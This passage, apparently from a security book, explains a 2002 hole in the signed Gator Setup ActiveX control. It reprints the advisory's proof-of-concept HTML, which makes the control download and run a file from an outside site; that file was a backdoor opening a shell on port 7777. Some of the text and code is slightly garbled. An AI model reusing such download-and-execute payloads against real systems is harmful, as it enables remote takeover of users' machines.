# Gator Signed ActiveX Control Control Attack

| Popularity: | 5 |
| Simplicity: | 7 |
| Impact: | 10 |
| Risk Rating: | 7 |

In 2002, EyeOnSecurity.net released a security advisory regarding their Gator EWallet software product. The vulnerability was actually in the Gator Setup ActiveX control used to install the product. Gator Setup is a signed control that looks for a file called setup.ex_, which decompresses it, and executes it. As a signed control, users are presented with the Authenticate setup dialog prompting them to install the control (shown in Figure 12-1).

If the Gator control was previously installed on a system, a malicious Web page or e-mail message could invoke it, use it to download a file from a malicious site, and then execute it (as long as the file was named setup.ex.). This is a classic example of Authenticate validating the control of a control, but not whether it performs secure actions.

EyeOnSecurity released proof-of-concept code in their advisory that showed how to invoke the Gator Setup control using the standard HTML <OBJECT> tag. They also demonstrated how to use a parameter to the control that downloaded a file name setup.ex_ from their Web site, and then executed it. The setup.ex_ file was actually a renamed door called tine.exe from Net.nu which sets up a listening shell on port 7777 (“References and Further Reading” at the end of this chapter). Here is the complete HTML:

```
<object
id="IEGator"
class="CLASSID:29EEFF42-F3FA-11D5-A9D5-0050041353C"
<param name="params"
  value="fcn=setup&src=eyeonsecurity.net/advisories/gatorexoit/
  setup.ex_&bgcolor=F0F1D0&aic=,aicStr,""&"
</object>
```
